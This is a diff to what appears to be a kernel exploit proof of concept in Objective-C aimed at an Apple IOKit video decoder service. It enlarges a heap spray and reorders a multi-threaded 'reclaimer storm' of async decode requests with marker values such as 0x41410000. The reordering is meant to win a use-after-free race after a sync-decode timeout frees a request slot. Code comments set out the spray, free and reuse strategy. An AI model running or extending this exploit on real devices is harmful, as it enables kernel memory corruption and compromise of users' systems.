@@ -244,7 +244,7 @@ static void reclaimAll(void) {
        our own sync decode; the Camera-triggered decode does. Churn the codec
        queue first so the next sync decode can hit the timeout path. */
     const int STHREADS = 8;
-    const int SITERS = 50;
+    const int SITERS = 100;
     const int SREQS = 10;
     __block int32_t sConn = 0, sReq = 0, sFail = 0;
     appendLog(@"mass spray start %dx%dx%d", STHREADS, SITERS, SREQS);
@@ -271,7 +271,40 @@ static void reclaimAll(void) {
     appendLog(@"mass spray done conn=%d req=%d fail=%d", sConn, sReq, sFail);
     usleep(1000000);
 
-    /* Phase 2: same-thread free/reuse cycles.
+    /* Phase 2: reclaimer storm starts before the sync cycle, so it is already
+       allocating when the timeout free happens. */
+    const int RTHREADS = 4;
+    __block int32_t rConn = 0, rReq = 0, rFail = 0;
+    appendLog(@"reclaimer start threads=%d", RTHREADS);
+    dispatch_group_t rgroup = dispatch_group_create();
+    for (int t = 0; t < RTHREADS; t++) {
+        dispatch_group_async(rgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            while (!gStop) {
+                io_connect_t c = 0;
+                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
+                if (opr != KERN_SUCCESS || !c) {
+                    __sync_fetch_and_add(&rFail, 1);
+                    usleep(1000);
+                    continue;
+                }
+                int n = submitAsync(c, srcID, dstID, W, H, 5,
+                                    0x41410000 + (t << 12) + (rConn & 0xfff), 1);
+                __sync_fetch_and_add(&rReq, n);
+                __sync_fetch_and_add(&rConn, 1);
+                time_t now = time(NULL);
+                if (now != gLastStormLog) {
+                    gLastStormLog = now;
+                    appendLog(@"storm conn=%d req=%d", rConn, rReq);
+                }
+                usleep(20000); /* keep requests in flight */
+                IOServiceClose(c);
+            }
+        });
+    }
+
+    usleep(100000);
+
+    /* Phase 3: same-thread free/reuse cycles.
        startDecoder_sync() blocks for up to 10s, times out, frees the request,
        and returns. The very next startDecoder allocation on the same
        connection should reuse that slot before the completion thread walks
@@ -301,36 +334,6 @@ static void reclaimAll(void) {
         }
         IOServiceClose(c);
         appendLog(@"cycle round=%d closed", round);
-    }
-
-    /* Phase 3: reclaimer storm for the Camera trigger. */
-    const int RTHREADS = 4;
-    __block int32_t rConn = 0, rReq = 0, rFail = 0;
-    appendLog(@"reclaimer start threads=%d", RTHREADS);
-    dispatch_group_t rgroup = dispatch_group_create();
-    for (int t = 0; t < RTHREADS; t++) {
-        dispatch_group_async(rgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            while (!gStop) {
-                io_connect_t c = 0;
-                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
-                if (opr != KERN_SUCCESS || !c) {
-                    __sync_fetch_and_add(&rFail, 1);
-                    usleep(1000);
-                    continue;
-                }
-                int n = submitAsync(c, srcID, dstID, W, H, 5,
-                                    0x41410000 + (t << 12) + (rConn & 0xfff), 1);
-                __sync_fetch_and_add(&rReq, n);
-                __sync_fetch_and_add(&rConn, 1);
-                time_t now = time(NULL);
-                if (now != gLastStormLog) {
-                    gLastStormLog = now;
-                    appendLog(@"storm conn=%d req=%d", rConn, rReq);
-                }
-                usleep(20000); /* keep requests in flight */
-                IOServiceClose(c);
-            }
-        });
     }
 
     /* Keep the storm alive while Camera is foregrounded. The background task
